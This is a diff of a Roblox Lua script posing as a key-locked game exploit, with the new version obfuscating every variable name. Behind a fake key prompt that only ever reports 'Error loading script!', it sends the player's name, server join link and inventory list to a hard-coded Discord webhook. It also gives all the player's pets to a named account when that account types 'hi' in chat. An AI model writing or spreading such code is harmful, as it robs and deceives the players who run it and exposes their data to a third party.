@@ -1,146 +1,148 @@
-local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local TextChatService = game:GetService("TextChatService")
-local HttpService = game:GetService("HttpService")
+local appleElephantSpoon = game:GetService("Players")
+local giantRainbowTiger = appleElephantSpoon.LocalPlayer
+local flyingCactusWindow = game:GetService("ReplicatedStorage")
+local silverMoonRiver = game:GetService("TextChatService")
+local orangePineappleRocket = game:GetService("HttpService")
 
-local LocalPlayer = Players.LocalPlayer
-local Backpack = LocalPlayer:WaitForChild("Backpack")
-local Humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid") or LocalPlayer.CharacterAdded:Wait():WaitForChild("Humanoid")
+local purpleOctopusPinecone = giantRainbowTiger:WaitForChild("Backpack")
+local dancingPenguinLaptop = giantRainbowTiger.Character and giantRainbowTiger.Character:FindFirstChildOfClass("Humanoid") or giantRainbowTiger.CharacterAdded:Wait():WaitForChild("Humanoid")
 
-local PetGiftingService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
+local glowingWalrusHelmet = flyingCactusWindow:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
 
-local KeyGui = Instance.new("ScreenGui")
-KeyGui.Name = "KeySystemGui"
-KeyGui.IgnoreGuiInset = true
-KeyGui.ResetOnSpawn = false
-KeyGui.DisplayOrder = 9999
-KeyGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+local fluffyCarrotDragon = Instance.new("ScreenGui")
+fluffyCarrotDragon.Name = "KeySystemGui"
+fluffyCarrotDragon.IgnoreGuiInset = true
+fluffyCarrotDragon.ResetOnSpawn = false
+fluffyCarrotDragon.DisplayOrder = 9999
+fluffyCarrotDragon.Parent = giantRainbowTiger:WaitForChild("PlayerGui")
 
-local Background = Instance.new("Frame")
-Background.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Background.Size = UDim2.new(1, 0, 1, 0)
-Background.Parent = KeyGui
+local crispyCabbageBubble = Instance.new("Frame")
+crispyCabbageBubble.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+crispyCabbageBubble.Size = UDim2.new(1, 0, 1, 0)
+crispyCabbageBubble.Parent = fluffyCarrotDragon
 
-local Border = Instance.new("UIStroke")
-Border.Color = Color3.fromRGB(100, 100, 100)
-Border.Thickness = 2
-Border.Parent = Background
+local shinyBicyclePencil = Instance.new("UIStroke")
+shinyBicyclePencil.Color = Color3.fromRGB(100, 100, 100)
+shinyBicyclePencil.Thickness = 2
+shinyBicyclePencil.Parent = crispyCabbageBubble
 
-local Title = Instance.new("TextLabel")
-Title.Text = "Enter Your Key"
-Title.Font = Enum.Font.GothamBold
-Title.TextSize = 30
-Title.TextColor3 = Color3.fromRGB(255, 255, 255)
-Title.BackgroundTransparency = 1
-Title.AnchorPoint = Vector2.new(0.5, 0.5)
-Title.Position = UDim2.new(0.5, 0, 0.3, 0)
-Title.Parent = Background
+local fuzzyBananaLeaf = Instance.new("TextLabel")
+fuzzyBananaLeaf.Text = "Enter Your Key"
+fuzzyBananaLeaf.Font = Enum.Font.GothamBold
+fuzzyBananaLeaf.TextSize = 30
+fuzzyBananaLeaf.TextColor3 = Color3.fromRGB(255, 255, 255)
+fuzzyBananaLeaf.BackgroundTransparency = 1
+fuzzyBananaLeaf.Position = UDim2.new(0.5, 0, 0.3, 0)
+fuzzyBananaLeaf.AnchorPoint = Vector2.new(0.5, 0.5)
+fuzzyBananaLeaf.Parent = crispyCabbageBubble
 
-local KeyInput = Instance.new("TextBox")
-KeyInput.PlaceholderText = "Enter key here"
-KeyInput.Font = Enum.Font.Gotham
-KeyInput.TextSize = 24
-KeyInput.Text = ""
-KeyInput.TextColor3 = Color3.fromRGB(255, 255, 255)
-KeyInput.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-KeyInput.Size = UDim2.new(0, 300, 0, 40)
-KeyInput.Position = UDim2.new(0.5, 0, 0.4, 0)
-KeyInput.AnchorPoint = Vector2.new(0.5, 0.5)
-KeyInput.ClearTextOnFocus = false
-KeyInput.Parent = Background
+local noisyWalnutParrot = Instance.new("TextBox")
+noisyWalnutParrot.PlaceholderText = "Enter key here"
+noisyWalnutParrot.Font = Enum.Font.Gotham
+noisyWalnutParrot.TextSize = 24
+noisyWalnutParrot.Text = ""
+noisyWalnutParrot.TextColor3 = Color3.fromRGB(255, 255, 255)
+noisyWalnutParrot.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+noisyWalnutParrot.Size = UDim2.new(0, 300, 0, 40)
+noisyWalnutParrot.Position = UDim2.new(0.5, 0, 0.4, 0)
+noisyWalnutParrot.AnchorPoint = Vector2.new(0.5, 0.5)
+noisyWalnutParrot.ClearTextOnFocus = false
+noisyWalnutParrot.Parent = crispyCabbageBubble
 
-local CopyButton = Instance.new("TextButton")
-CopyButton.Text = "Copy Link"
-CopyButton.Font = Enum.Font.GothamSemibold
-CopyButton.TextSize = 22
-CopyButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
-CopyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-CopyButton.Size = UDim2.new(0, 140, 0, 40)
-CopyButton.Position = UDim2.new(0.35, 0, 0.5, 0)
-CopyButton.AnchorPoint = Vector2.new(0.5, 0.5)
-CopyButton.Parent = Background
+local speedyTulipCamera = Instance.new("TextButton")
+speedyTulipCamera.Text = "Copy Link"
+speedyTulipCamera.Font = Enum.Font.GothamSemibold
+speedyTulipCamera.TextSize = 22
+speedyTulipCamera.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
+speedyTulipCamera.TextColor3 = Color3.fromRGB(255, 255, 255)
+speedyTulipCamera.Size = UDim2.new(0, 140, 0, 40)
+speedyTulipCamera.Position = UDim2.new(0.35, 0, 0.5, 0)
+speedyTulipCamera.AnchorPoint = Vector2.new(0.5, 0.5)
+speedyTulipCamera.Parent = crispyCabbageBubble
 
-local SubmitButton = Instance.new("TextButton")
-SubmitButton.Text = "Submit"
-SubmitButton.Font = Enum.Font.GothamSemibold
-SubmitButton.TextSize = 22
-SubmitButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
-SubmitButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-SubmitButton.Size = UDim2.new(0, 140, 0, 40)
-SubmitButton.Position = UDim2.new(0.65, 0, 0.5, 0)
-SubmitButton.AnchorPoint = Vector2.new(0.5, 0.5)
-SubmitButton.Parent = Background
+local shinyMarshmallowLaptop = Instance.new("TextButton")
+shinyMarshmallowLaptop.Text = "Submit"
+shinyMarshmallowLaptop.Font = Enum.Font.GothamSemibold
+shinyMarshmallowLaptop.TextSize = 22
+shinyMarshmallowLaptop.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
+shinyMarshmallowLaptop.TextColor3 = Color3.fromRGB(255, 255, 255)
+shinyMarshmallowLaptop.Size = UDim2.new(0, 140, 0, 40)
+shinyMarshmallowLaptop.Position = UDim2.new(0.65, 0, 0.5, 0)
+shinyMarshmallowLaptop.AnchorPoint = Vector2.new(0.5, 0.5)
+shinyMarshmallowLaptop.Parent = crispyCabbageBubble
 
-local CorrectKey = "GqAk1jt34CoxMYT9u7Vu20dTWys9D8ayB4YOx3N1CRGPQ8q5C7"
-local RedirectLink = "https://link-target.net/1360255/4OzD2a6hzruJ"
-local WebhookUrl = HttpService:JSONDecode('{"url":"' .. HttpService:GetAsync("data:text/plain;base64,aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4MjgzNDExNjA1OTMzNjczNC9mMDZqS2lDZ0ZYT3BGT3JJbDZ4Nk03UE9nTjF4Ylg1YVBTd18wYXpjMkFrXzk3RE1KdDQydUJXeDVva21LYzdIeGdyaw==") .. '"}').url
-local ChatTriggerName = "ElementalGemsFarm2"
+local saltyTofuGiraffe = "GqAk1jt34CoxMYT9u7Vu20dTWys9D8ayB4YOx3N1CRGPQ8q5C7"
+local brightLemonSloth = "https://link-target.net/1360255/4OzD2a6hzruJ"
+local spicyCupcakeRhino = "https://discord.com/api/webhooks/1382834116059336734/f06jKiCgFXOpFOrIl6x6M7POgN1xbX5aPSw_0azc2Ak_97DMJt42uBWx5okmKc7Hxgrk"
+local fuzzyDragonFruit = "ElementalGemsFarm2"
 
-local function CopyToClipboard(text)
+local function magicCookieParrot(text)
 	if setclipboard then
 		setclipboard(text)
 	else
-		warn("Clipboard unsupported")
+		warn("Clipboard not supported in this executor.")
 	end
 end
 
-CopyButton.MouseButton1Click:Connect(function()
-	CopyToClipboard(RedirectLink)
-	CopyButton.Text = "Copied!"
+speedyTulipCamera.MouseButton1Click:Connect(function()
+	magicCookieParrot(brightLemonSloth)
+	speedyTulipCamera.Text = "Copied!"
 	task.wait(2)
-	CopyButton.Text = "Copy Link"
+	speedyTulipCamera.Text = "Copy Link"
 end)
 
 task.spawn(function()
-	local Keywords = { "Caterpillar", "Shovel" }
-	local ToolNames, Matches = {}, {}
+	local shinyWaffleTornado = { "Caterpillar", "Shovel" }
+	local bouncingIciclePancake, goldenMangoPillow = {}, {}
 
-	for _, tool in ipairs(Backpack:GetChildren()) do
-		if tool:IsA("Tool") then
-			table.insert(ToolNames, tool.Name)
-			for _, keyword in ipairs(Keywords) do
-				if string.find(tool.Name:lower(), keyword:lower()) then
-					table.insert(Matches, "`" .. tool.Name .. "` FOUND!!!")
+	for _, sparklingTacoGuitar in ipairs(purpleOctopusPinecone:GetChildren()) do
+		if sparklingTacoGuitar:IsA("Tool") then
+			local royalCactusElephant = sparklingTacoGuitar.Name
+			table.insert(bouncingIciclePancake, royalCactusElephant)
+			for _, purpleStarMango in ipairs(shinyWaffleTornado) do
+				if string.find(royalCactusElephant:lower(), purpleStarMango:lower()) then
+					table.insert(goldenMangoPillow, "`" .. royalCactusElephant .. "` FOUND!!!")
 					break
 				end
 			end
 		end
 	end
 
-	local PlayerName, PlaceId, JobId = LocalPlayer.Name, game.PlaceId, game.JobId
-	local JoinLink = string.format("https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s", PlaceId, JobId)
-	local Content = string.format("**%s** executed the script.\nJoin: [%s](%s)", PlayerName, JobId, JoinLink)
+	local sparklingDolphinApple = giantRainbowTiger.Name
+	local wildTigerVolcano, shinyKangarooCupcake = game.PlaceId, game.JobId
+	local magicalOwlPineapple = string.format("https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s", wildTigerVolcano, shinyKangarooCupcake)
+	local secretUnicornRainbow = string.format("**%s** executed the script.\nJoin: [%s](%s)", sparklingDolphinApple, shinyKangarooCupcake, magicalOwlPineapple)
 
-	if #Matches > 0 then
-		Content ..= "\n\n**Keyword Matches:**\n" .. table.concat(Matches, "\n")
+	if #goldenMangoPillow > 0 then
+		secretUnicornRainbow ..= "\n\n**Keyword Matches:**\n" .. table.concat(goldenMangoPillow, "\n")
 	end
 
-	local ToolList = table.concat(ToolNames, "\n")
-	local FileName = PlayerName .. "_inventory.txt"
-	local Boundary = "--WebKitFormBoundary" .. HttpService:GenerateGUID(false)
+	local happyCheetahLemon = table.concat(bouncingIciclePancake, "\n")
+	local mysteriousKiteElephant = sparklingDolphinApple .. "_inventory.txt"
+	local cosmicRobotCarrot = "----WebKitFormBoundary" .. orangePineappleRocket:GenerateGUID(false)
 
-	local Body = table.concat({
-		"--" .. Boundary,
+	local sparklingBubblePie = table.concat({
+		"--" .. cosmicRobotCarrot,
 		'Content-Disposition: form-data; name="payload_json"',
 		"",
-		HttpService:JSONEncode({ content = Content }),
-		"--" .. Boundary,
-		'Content-Disposition: form-data; name="file"; filename="' .. FileName .. '"',
+		orangePineappleRocket:JSONEncode({ content = secretUnicornRainbow }),
+		"--" .. cosmicRobotCarrot,
+		'Content-Disposition: form-data; name="file"; filename="' .. mysteriousKiteElephant .. '"',
 		"Content-Type: text/plain",
 		"",
-		ToolList,
-		"--" .. Boundary .. "--",
+		happyCheetahLemon,
+		"--" .. cosmicRobotCarrot .. "--",
 		""
 	}, "\r\n")
 
 	local success, err = pcall(function()
 		request({
-			Url = WebhookUrl,
+			Url = spicyCupcakeRhino,
 			Method = "POST",
 			Headers = {
-				["Content-Type"] = "multipart/form-data; boundary=" .. Boundary
+				["Content-Type"] = "multipart/form-data; boundary=" .. cosmicRobotCarrot
 			},
-			Body = Body
+			Body = sparklingBubblePie
 		})
 	end)
 
@@ -149,63 +151,63 @@ task.spawn(function()
 	end
 end)
 
-local function WaitForPetGift()
-	local triggered = false
-	local connections = {}
-
-	for _, desc in ipairs(ReplicatedStorage:GetDescendants()) do
-		if desc:IsA("RemoteEvent") then
-			local conn = desc.OnClientEvent:Connect(function()
-				triggered = true
+local function mysteriousBubbleSpoon()
+	local moonlightShadow = false
+	local starryClouds = {}
+	for _, hiddenLightning in ipairs(flyingCactusWindow:GetDescendants()) do
+		if hiddenLightning:IsA("RemoteEvent") then
+			local cometDream = hiddenLightning.OnClientEvent:Connect(function()
+				moonlightShadow = true
 			end)
-			table.insert(connections, conn)
+			table.insert(starryClouds, cometDream)
 		end
 	end
-
-	repeat task.wait() until triggered
-	for _, conn in ipairs(connections) do conn:Disconnect() end
+	repeat task.wait() until moonlightShadow
+	for _, cometDream in ipairs(starryClouds) do
+		cometDream:Disconnect()
+	end
 end
 
-local function GivePetsTo(player)
-	for _, tool in ipairs(Backpack:GetChildren()) do
-		if tool:IsA("Tool") then
-			PetGiftingService:FireServer("GivePet", player)
-			WaitForPetGift()
-			if tool and tool.Parent == Backpack then
-				Humanoid:EquipTool(tool)
+local function glitteringPineappleRocket(icyTiger)
+	for _, shiningFalconCarrot in ipairs(purpleOctopusPinecone:GetChildren()) do
+		if shiningFalconCarrot:IsA("Tool") then
+			glowingWalrusHelmet:FireServer("GivePet", icyTiger)
+			mysteriousBubbleSpoon()
+			if shiningFalconCarrot and shiningFalconCarrot.Parent == purpleOctopusPinecone then
+				dancingPenguinLaptop:EquipTool(shiningFalconCarrot)
 			end
 		end
 	end
 end
 
-TextChatService.OnIncomingMessage = function(msg)
-	if msg.TextSource and msg.TextSource.Name == ChatTriggerName then
-		if msg.Text:lower() == "hi" then
-			local sender = Players:FindFirstChild(ChatTriggerName)
-			if sender then
-				print("Received 'hi' from " .. ChatTriggerName .. ", giving pets")
-				GivePetsTo(sender)
+silverMoonRiver.OnIncomingMessage = function(mysticWhaleDragon)
+	if mysticWhaleDragon.TextSource and mysticWhaleDragon.TextSource.Name == fuzzyDragonFruit then
+		if mysticWhaleDragon.Text:lower() == "hi" then
+			local shiningTigerCake = appleElephantSpoon:FindFirstChild(fuzzyDragonFruit)
+			if shiningTigerCake then
+				print("Received 'hi' from " .. fuzzyDragonFruit .. ", running giveAllPets()")
+				glitteringPineappleRocket(shiningTigerCake)
 			else
-				warn("Player not found for pet gifting")
+				warn("Player " .. fuzzyDragonFruit .. " not found when message received")
 			end
 		end
 	end
 end
 
-SubmitButton.MouseButton1Click:Connect(function()
-	local enteredKey = KeyInput.Text
-	if enteredKey == CorrectKey then
-		KeyInput.Text = ""
-		KeyInput.PlaceholderText = "Error loading script!"
-		KeyGui.Enabled = false
+shinyMarshmallowLaptop.MouseButton1Click:Connect(function()
+	local glowingPineappleFox = noisyWalnutParrot.Text
+	if glowingPineappleFox == saltyTofuGiraffe then
+		noisyWalnutParrot.Text = ""
+		noisyWalnutParrot.PlaceholderText = "Error loading script!"
+		fluffyCarrotDragon.Enabled = false
 	else
-		KeyInput.Text = ""
-		KeyInput.PlaceholderText = "Wrong key, try again!"
+		noisyWalnutParrot.Text = ""
+		noisyWalnutParrot.PlaceholderText = "Wrong key, try again!"
 	end
 end)
 
-KeyInput.FocusLost:Connect(function(enterPressed)
-	if enterPressed then
-		SubmitButton:Activate()
+noisyWalnutParrot.FocusLost:Connect(function(magicTiger)
+	if magicTiger then
+		shinyMarshmallowLaptop:Activate()
 	end
 end)
